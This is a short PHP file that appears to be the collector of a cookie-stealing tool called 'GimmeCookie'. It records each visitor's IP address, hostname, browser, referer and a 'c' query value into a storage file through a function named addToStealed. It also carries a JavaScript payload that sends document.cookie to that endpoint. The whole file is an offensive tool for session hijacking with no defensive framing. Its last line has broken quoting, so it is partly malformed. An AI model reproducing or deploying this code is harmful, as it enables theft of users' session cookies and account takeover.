<?PHP
// Protection against unauthorized access
if (!defined('GimmeCookie')) {
    header('Location: ./main');
    die;
}

$site['titl'] .= ' :: Main';

$ip     = $_SERVER['REMOTE_ADDR'];
$host   = gethostbyaddr($ip);
$navigator  = $_SERVER['HTTP_USER_AGENT'];
$date   = date("d/m/Y");
$time   = date("H:i:s");
$referer  = (!empty($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : 'Unspecified';
$log    = DIR.DS.'inc'.DS.'storage.php';

if(isset($_GET['c'])) 
  $data = $_GET['c'];
else 
  $data = 'Empty data';

addToStealed($log, $ip, $host, $navigator, $date, $time, $referer, $data);

$content = '<script>location.href='/main?c='+escape(document.cookie)</script> Unauthorized Access';